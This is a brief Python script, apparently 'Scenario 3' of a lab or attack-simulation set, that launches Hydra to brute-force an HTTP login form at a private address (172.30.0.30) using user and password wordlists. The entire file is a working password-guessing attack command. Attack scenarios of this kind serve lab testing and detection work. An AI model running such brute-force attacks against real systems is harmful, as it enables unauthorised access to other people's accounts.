# Author: Lazaro Perez Jr.

# Scenario 3: Hydra brute force on the HTTP login
import subprocess
def run():
	command=["hydra","-L","/attacks/wordlists/users.txt","-P","/attacks/wordlists/passwords.txt","172.30.0.30","http-post-form","/login:username=^USER^&password=^PASS^:F=Invalid"]
	subprocess.run(command)
